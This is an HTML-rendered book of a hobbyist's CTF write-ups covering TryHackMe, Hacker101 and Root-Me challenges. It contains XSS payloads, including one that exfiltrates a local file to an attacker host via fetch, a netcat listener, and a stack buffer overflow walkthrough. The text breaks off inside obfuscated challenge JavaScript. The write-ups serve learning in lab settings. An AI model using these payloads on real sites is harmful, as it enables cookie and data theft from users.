<!DOCTYPE HTML>
<html lang="en" class="light" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title></title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('light')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="pwn.html">~/</a></li><li class="chapter-item expanded affix "><li class="part-title">TryHackMe</li><li class="chapter-item expanded "><a href="tryhackme/The-Sticker-Shop.html"><strong aria-hidden="true">1.</strong> The Sticker Shop</a></li><li class="chapter-item expanded affix "><li class="part-title">Hackerone CTF</li><li class="chapter-item expanded "><a href="hacker101/get-started/index.html"><strong aria-hidden="true">2.</strong> Get Started</a></li><li class="chapter-item expanded "><a href="hacker101/Micro-CMSv1/index.html"><strong aria-hidden="true">3.</strong> Micro CMSv1</a></li><li class="chapter-item expanded affix "><li class="part-title">RootMe</li><li class="chapter-item expanded "><a href="rootme/APP_SYSTEM/index.html"><strong aria-hidden="true">4.</strong> APP System</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rootme/APP_SYSTEM/ELF_x86_Stack_buffer_overflow_basic_1/index.html"><strong aria-hidden="true">4.1.</strong> ELF x86 Stack BOF basic 1</a></li></ol></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/index.html"><strong aria-hidden="true">5.</strong> WEB CLIENT</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/HTML_disabled_buttons/index.html"><strong aria-hidden="true">5.1.</strong> HTML - disabled buttons</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/JS_Authentication/index.html"><strong aria-hidden="true">5.2.</strong> JS Authentication</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript_Authentication/index.html"><strong aria-hidden="true">5.3.</strong> Javascript - Authentication</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript_Native_code/index.html"><strong aria-hidden="true">5.4.</strong> Javascript - Native code</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Obfuscation_JS/index.html"><strong aria-hidden="true">5.5.</strong> Obfuscation JS</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript_Obfuscation_2/index.html"><strong aria-hidden="true">5.6.</strong> Javascript - Obfuscation 2</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript_Source/index.html"><strong aria-hidden="true">5.7.</strong> Javascript - Source</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript-Obfuscation-3/index.html"><strong aria-hidden="true">5.8.</strong> Javascript - Obfuscation 3</a></li><li class="chapter-item expanded "><a href="rootme/WEB_CLIENT/Javascript-Webpack/index.html"><strong aria-hidden="true">5.9.</strong> Javascript Webpack</a></li></ol></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/index.html"><strong aria-hidden="true">6.</strong> WEB SERVER</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rootme/WEB_Server/JWT-Introduction/index.html"><strong aria-hidden="true">6.1.</strong> JWT Introduction</a></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/HTTP-Openredirect.html"><strong aria-hidden="true">6.2.</strong> HTTP - Open redirect</a></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/JWT-Weak-secret.html"><strong aria-hidden="true">6.3.</strong> JWT - Weak secret</a></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/HTTP-User-agent.html"><strong aria-hidden="true">6.4.</strong> HTTP - User-agent</a></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/HTTP-POST.html"><strong aria-hidden="true">6.5.</strong> HTTP - Cookies</a></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/HTTP-Directory-indexing.html"><strong aria-hidden="true">6.6.</strong> HTTP Directory Indexing</a></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/HTTP-improper-redirect.html"><strong aria-hidden="true">6.7.</strong> HTTP Improper Redirection</a></li><li class="chapter-item expanded "><a href="rootme/WEB_Server/php-command-injection.html"><strong aria-hidden="true">6.8.</strong> PHP Command Injection</a></li></ol></li><li class="chapter-item expanded "><a href="rootme/Network/index.html"><strong aria-hidden="true">7.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rootme/Network/FTP_authentication.html"><strong aria-hidden="true">7.1.</strong> FTP - authentication</a></li></ol></li><li class="chapter-item expanded "><a href="rootme/APP_Script/index.html"><strong aria-hidden="true">8.</strong> APP SCRIPT</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rootme/APP_Script/bash-system1.html"><strong aria-hidden="true">8.1.</strong> Bash - System 1</a></li><li class="chapter-item expanded "><a href="rootme/APP_Script/python-input.html"><strong aria-hidden="true">8.2.</strong> Python - input()</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="pwn"><a class="header" href="#pwn">pwn</a></h1>
<h3 align="center">
	<img src="https://avatars.githubusercontent.com/u/109761382?v=4&h=300&w=300&fit=cover&mask=circle&maxage=7d
)" width="100" alt="Logo"/><br/>
@pwnspirit
	<img src="https://raw.githubusercontent.com/catppuccin/catppuccin/main/assets/misc/transparent.png" height="30" width="0px"/>
</h3>
<p>Hii, I'm <a href="https://github.com/pwnspirit">pwnspirit</a>. I am a 18 years old guy from Nepal, who loves computers and softwares.</p>
<p>I'm a Security Researcher(not by profession), I play ctfs and do <a href="https://hackerone.com/pwn_">Bug Bounty</a>. I believe in secure software and FOSS. Here you can find most of my writeups related to <a href="https://ctf.hackthebox.com/user/profile/369283">CTFs'</a> and my findings.</p>
<h2 id="find-me"><a class="header" href="#find-me"><code>Find me </code></a></h2>
<ul>
<li><a href="https://x.com/pwnspirit">x/@pwnspirit</a></li>
<li><a href="https://github.com/pwnspirit">github/@pwnspirit</a></li>
<li><a href="https://ko-fi.com/pwnspirit">Ko-fi/@pwnspirit</a></li>
</ul>
<p align="center">
  <img src="https://raw.githubusercontent.com/catppuccin/catppuccin/main/assets/footers/gray0_ctp_on_line.svg?sanitize=true" />
</p>
<div style="break-before: page; page-break-before: always;"></div><img width="100" align="center" alt="thm" src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377390091" />
<h1 id="the-sticker-shop"><a class="header" href="#the-sticker-shop">The Sticker Shop</a></h1>
<p><strong>Can you exploit the sticker shop in order to capture the flag?</strong></p>
<p>Starting task, as we are going to face with a server run by a Local Sticker Shop hosted. I started the machine and jump over it.</p>
<img alt="starting the machine" src="https://github.com/user-attachments/assets/15653f9d-7c60-470b-b242-cd5c12b856a9" />
<img width="1000" align="catppuccin line" src="https://github-production-user-asset-6210df.s3.amazonaws.com/109761382/399944576-8a04c1c1-9f58-4f23-9548-4c71971b3576.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20260109%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260109T140147Z&X-Amz-Expires=300&X-Amz-Signature=2be548619a8625a1b197b2e29de99408a8bbcf92c682e5bcf78b16cc0cdd6762&X-Amz-SignedHeaders=host" />
<p>The first step I took is to visit the website and looked for the source and found <code>/submit_feedback</code> dir, which catched me.</p>
<div class="table-wrapper"><table><thead><tr><th><img widht="900" src="https://github.com/user-attachments/assets/4a67214b-a540-4705-a765-53b4eff79e2e" /></th><th><img width="900" src="https://github.com/user-attachments/assets/6741784c-c161-4b4d-a135-e871ae2f9742" /></th></tr></thead><tbody>
</tbody></table>
</div>
<p>And I visited to <strong><code>/submit_feedback</code></strong> and found a submition functionality available.</p>
<img width="1000" alt="Screenshot from 2025-01-03 07-33-51" src="https://github.com/user-attachments/assets/0f94ce61-f51c-4e6c-afdd-99ee943ce345" />
<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
<p>As soon I saw this, I just started to try random XSS payloads, from <a href="https://github.com/payloadbox/xss-payload-list">payloadbox/xss-payload-list</a>, and cam to this payload..</p>
<pre><code class="language-js">&lt;img src=x onerror="fetch('&lt;ip&gt;:8080')"/&gt;
</code></pre>
<blockquote>
<p>[!NOTE]
In the above payload an image would be loaded as img tag refers to <strong>X</strong> location, since the src fail to load and it simply goes to execute following and we just can grap the http request using <code>nc</code></p>
<pre><code class="language-js">fetch('http://&lt;ip&gt;:8080');
</code></pre>
</blockquote>
<p>And I just <code>nc</code> the headers before the submition of the payload, and yeah like this !!!</p>
<pre><code class="language-bash">nc -knvlp 8080
</code></pre>
<div class="table-wrapper"><table><thead><tr><th><img src="https://github.com/user-attachments/assets/dd775ed6-f065-4a75-b271-1ee69639c288" alt="Screenshot from 2025-01-03 08-10-35" /></th><th><img src="https://github.com/user-attachments/assets/ba98eb99-9e6f-452a-8058-fcee51bed3e4" alt="Screenshot from 2025-01-03 08-08-40" /></th></tr></thead><tbody>
<tr><td><img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" /></td><td></td></tr>
<tr><td>Now to grab the flag I have used the following payload..</td><td></td></tr>
</tbody></table>
</div>
<pre><code class="language-js">&lt;img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r =&gt; r.text()).then(r =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + r)).catch(e =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + e))"/&gt;
</code></pre>
<blockquote>
<p>[!NOTE]
Componenets..</p>
</blockquote>
<ul>
<li><code>&lt;img src="x" onerror="..."&gt;</code>  - The image <code>src</code> is invalid, causing the <code>onerror</code> attribute to execute when the browser fails to load the image.</li>
<li><code>fetch('http://127.0.0.1:8080/flag.txt')</code> - This initiates an HTTP GET request to the victim's localhost at port 8080, targeting the <code>flag.txt</code> file.</li>
<li><code>.then(r =&gt; r.text())</code> - If the request succeeds, this processes the response (<code>r</code>) and converts it into text using the <code>.text()</code> method.</li>
<li><code>.then(r =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + r))</code> - After retrieving the file content, another <code>fetch</code> request sends the content (<code>r</code>) to the attacker's server (<code>http://&lt;ip&gt;:8080</code>) as part of the query string (<code>?c=...</code>).</li>
<li><code>.catch(e =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + e))</code> - If the initial <code>fetch</code> fails (e.g., the file doesn't exist or CORS blocks the request), the <code>catch</code> block handles the error and sends the error message (<code>e</code>) to the attacker's server.
<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
<img width="1000"  alt="flag png" src="https://github.com/user-attachments/assets/6d86b886-7eed-492d-86c9-05cb9a1b6d09" /></li>
</ul>
<p><em><strong>Yes! Thank you for reading till here ;)</strong></em></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="a-little-something-to-get-you-started"><a class="header" href="#a-little-something-to-get-you-started">A little something to get you started</a></h3>
<p>Here is the initial look when I spawn the challenge.</p>
<p><img src="hacker101/get-started/image.png" alt="alt text" /></p>
<p>After looking into the source, I can see there is a <code>background.png</code> file ,</p>
<p><img src="hacker101/get-started/image-1.png" alt="alt text" /></p>
<p>Let's try to access it.</p>
<p>Here we got the flag. ease : )</p>
<p><img src="hacker101/get-started/image-2.png" alt="flag" /></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="micro-cms-v1"><a class="header" href="#micro-cms-v1">Micro-CMS v1</a></h3>
<p>So In this challenge, we need to find the 4 flags and submit it to h1ctf. Let's try to solve the chall.
Here is the first look when I spawn the chall.</p>
<p><img src="hacker101/Micro-CMSv1/image-2.png" alt="alt text" /></p>
<p>We can edit the already posted readme and create another one. Let's try to create a new one. Here, I created one with <code>pwntest</code> and the interesting thing is the url for the post which is <code>page/9</code></p>
<pre><code class="language-js">https://10f9bae117c1def0cfa05ff020a257ff.ctf.hacker101.com/page/9
</code></pre>
<p>After that I tried to visit all the pages from 0 to 9. But we got a forbidden page for post 4. Interesting(noted).</p>
<p><img src="hacker101/Micro-CMSv1/image-1.png" alt="alt text" /></p>
<p>There is written, script is not allowed, which I think we can trigger XSS by editing the markdown file.</p>
<p><img src="hacker101/Micro-CMSv1/image-3.png" alt="alt text" /></p>
<p>I searched for some payloads over github. I'm looking for something like marddown taks which can pop up XSS and found this payload. let's execute this.</p>
<pre><code class="language-md">&lt;img src =q onerror=prompt(8)&gt;
</code></pre>
<p>yup, we got the first flag.</p>
<p><img src="hacker101/Micro-CMSv1/image-5.png" alt="alt text" /></p>
<p>Let's look for another, As mentioned earlier, we were facing <code>forbidden</code> at page <code>4</code>, let's try to edit the page instead of accessing it. yup, we got another flag.</p>
<p><img src="hacker101/Micro-CMSv1/image-6.png" alt="alt text" /></p>
<p>Yup, I was trying to play with charectors like <code>", "+, '</code> and got the flag.</p>
<p><img src="hacker101/Micro-CMSv1/image-7.png" alt="alt text" /></p>
<p>Now, for the last flag , I used</p>
<pre><code class="language-js">&lt;script&gt;alert(7*7)&lt;/script&gt;
</code></pre>
<p>in the title section, and it gave me the final flag.</p>
<p><img src="hacker101/Micro-CMSv1/image-9.png" alt="alt text" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="app-system"><a class="header" href="#app-system">APP System</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h3 id="elf-x86---stack-buffer-overflow-basic-1"><a class="header" href="#elf-x86---stack-buffer-overflow-basic-1">ELF x86 - Stack buffer overflow basic 1</a></h3>
<p>Here is the <code>C</code> code which is given in the chall.</p>
<details>
<summary>C code</summary>
<pre><code class="language-c">#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) &amp;&amp; (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
</code></pre>
</details>
<p>Let's access the server via <code>ssh</code>. and try to solve the chall.</p>
<pre><code class="language-bash">
ssh -p 2222 app-systeme-ch13@challenge02.root-me.org
</code></pre>
<p>Here, we have some files which got my attention.</p>
<img alt="image" src="https://github.com/user-attachments/assets/0f960bfd-a5cc-4b96-a72c-81c3ae689de3" />
<p>We have a <code>.passwd</code> file, and it seems like there we can get the flag for the chall. Unfortunately. we cann't access the file, as we don't have access for it.</p>
<img alt="image" src="https://github.com/user-attachments/assets/4e81e592-3263-424d-a447-40b26b7d1a05" />
<p>Now, let's dive into the vulnerable code and spawn the shell,</p>
<p>We have <code>char buf[40];</code> buffer set but the program allows <code>fgets(buf, 45, stdin);</code> 45 long buffer. So, my metholodogy will be</p>
<ol>
<li>The <code>check</code> variable is stored right after the buffer in memory.</li>
<li>By overflowing the buffer, we can overwrite <code>check</code>.</li>
<li>We need to change <code>check</code> to <code>0xdeadbeef</code>.</li>
</ol>
<p>Let's quickly check for the binary protections and jump right into it.
<img  alt="image" src="https://github.com/user-attachments/assets/36c842cb-04df-42b2-a06b-60e81b0778ea" /></p>
<p>hmm. looks simple.</p>
<p>Here I'm giving the exact 40 long buffer and see what it return.
<img  alt="image" src="https://github.com/user-attachments/assets/09a92835-4c50-4fdc-87dd-239cc06e849c" /></p>
<p>Well, as expected, providing extra 4 bytes (<code>\xef\xbe\xad\xde</code>) to overflow into check and we can now overwrite it with <code>0xdeadbeef</code>.</p>
<pre><code class="language-c">if ((check != 0x04030201) &amp;&amp; (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

if (check == 0xdeadbeef)
</code></pre>
<img  alt="image" src="https://github.com/user-attachments/assets/4a83ebce-678b-425e-bee6-9b5d8d693b3e" />
<p>It closed the shell immediatly, Let's try run <code>cat</code> to keep <code>stdin</code> open.</p>
<img  alt="image" src="https://github.com/user-attachments/assets/546844b8-ec86-408f-85d0-225121667053" />
<p>Wallah, we got the shell.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-client"><a class="header" href="#web-client">WEB CLIENT</a></h1>
<p>!&gt; [!NOTE]</p>
<blockquote>
<p>Here you can find some of mostly solved challenges, as part of the root-me rules, I'm unable to add all the writeups. If you need any guidance, you may also ping me over <a href="https://discord.com/users/936853051984199750">Disocrd</a></p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h3 id="html---disabled-buttons"><a class="header" href="#html---disabled-buttons">HTML - disabled buttons</a></h3>
<h4 id="html-protection--huh-make-sense"><a class="header" href="#html-protection--huh-make-sense">HTML protection ? huh make sense.</a></h4>
<p>As we can see there is nothing rather than spawn machine and a statement <em><strong>This form is disabled and can not be used. It’s up to you to find a way to use it.</strong></em>.
I just spawn the chall, and got interface like below:</p>
<img alt="image" src="https://github.com/user-attachments/assets/9e40530a-f1e2-4b0b-9f8b-7e597b468137" />
<p>And checked from the browser dev tool. As you can in the attached screnshot, there is <code>input</code> with value <code>disabled</code>. What if I change it to enabled ?? Let's see:</p>
<img alt="image" src="https://github.com/user-attachments/assets/43371f08-0183-478c-83b8-01e77731b2a6" />
<p>Now , I can submit member access, I put <code>anything</code> there and I got the password.</p>
<img alt="image" src="https://github.com/user-attachments/assets/aede9324-9e75-4e64-8be6-e35af7464224" />
<div style="break-before: page; page-break-before: always;"></div><h3 id="js-authentication"><a class="header" href="#js-authentication">JS Authentication</a></h3>
<p>This time also source code but little different, We got the following code.</p>
<pre><code class="language-js">function connexion(){
    var username = prompt("Username :", "");
    var password = prompt("Password :", "");
    var TheLists = ["reallyhidden"];
    for (i = 0; i &lt; TheLists.length; i++)
    {
        if (TheLists[i].indexOf(username) == 0)
        {
            var TheSplit = TheLists[i].split(":");
            var TheUsername = TheSplit[0];
            var ThePassword = TheSplit[1];
            if (username == TheUsername &amp;&amp; password == ThePassword)
            {
                alert("Vous pouvez utiliser ce mot de passe pour valider ce challenge (en majuscules) / You can use this password to validate this challenge (uppercase)");
            }
        }
        else
        {
            alert("Nope, you're a naughty hacker.")
        }
    }
}
</code></pre>
<p>Here you can see Hardcoded credentials list: which is <code>["reallyhidden"];</code>, I submitted it as username and password.</p>
<img alt="image" src="https://github.com/user-attachments/assets/06e6a006-dbe9-43cb-b452-0f904baa5411" />
<hr />
<div style="break-before: page; page-break-before: always;"></div><h3 id="javascript---authentication"><a class="header" href="#javascript---authentication">Javascript - Authentication</a></h3>
<p>The challenge seems like authentication bypass or something like this. I have stated the chall and it bring me to login page.</p>
<img alt="image" src="https://github.com/user-attachments/assets/29fc358f-300c-4adc-b919-88b40c82aa8d" />
<p>I tried login using default password and username like <code>admin</code> &amp; <code>admin</code> OR <code>admin</code> &amp; <code>pass</code> but didn't work.</p>
<p>After that I continue to look over source code. There I can find a JS script called <code>login.js</code>, in which we got our creds.</p>
<img alt="image" src="https://github.com/user-attachments/assets/7bf1f1d0-1865-440b-a86d-ecc464ae0c07" />
<p>I submitted the password as password, and yahu it got solved.</p>
<h4 id="lesson-learned"><a class="header" href="#lesson-learned">lesson learned,</a></h4>
<blockquote>
<p>Always read source code, alware inspect even if its a 404 page : )</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h3 id="javascript---native-code"><a class="header" href="#javascript---native-code">Javascript - Native code</a></h3>
<p>After opening the challenge, we got a password input poping up, but we don't know the password. The goal is to find the password.</p>
<img alt="image" src="https://github.com/user-attachments/assets/318c5b0e-07ee-476b-b943-f1d773f2d772" />
<p>Let's instpect the source and try to find the password. Here we got something like gibbrish code (JSfuck)
<img alt="image" src="https://github.com/user-attachments/assets/eee3931a-9568-4b7a-bd2c-9711de8c2802" /></p>
<p>If we decode the code we might able to find the flag, the One way to decode the JS fuck code is console, lets try it.</p>
<pre><code class="language-js">   &lt;script&gt;
            É = -~-~[],
            ó = -~É,
            Ë = É &lt;&lt; É,
            þ = Ë + ~[];
            Ì = (ó - ó)[Û = ('' + {})[É + ó] + ('' + {})[ó - É] + ([].ó + '')[ó - É] + (!!'' + '')[ó] + ({} + '')[ó + ó] + (!'' + '')[ó - É] + (!'' + '')[É] + ('' + {})[É + ó] + ({} + '')[ó + ó] + ('' + {})[ó - É] + (!'' + '')[ó - É]][Û];
            Ì(Ì((!'' + '')[ó - É] + (!'' + '')[ó] + (!'' + '')[ó - ó] + (!'' + '')[É] + ((!'' + ''))[ó - É] + ([].$ + '')[ó - É] + '\'' + '' + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (þ) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (É + ó) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (ó - ó) + (É + ó) + '\\' + (ó - É) + (É + ó) + (ó + ó) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (þ) + (É) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + ó) + (É + ó) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + É) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (É + ó) + (ó - É) + '\\' + (ó - É) + (É + É) + (ó + ó) + '\\' + (É + ó) + (ó - ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (þ) + (É + ó) + '\\' + (þ) + (É + ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó + ó) + (ó - É) + '\\' + (ó + ó) + (É) + '\\' + (ó + ó) + (ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (ó - É) + (þ) + (ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (É + É) + (É) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (ó + ó) + (ó + ó) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (þ) + (É + ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (þ) + (ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + 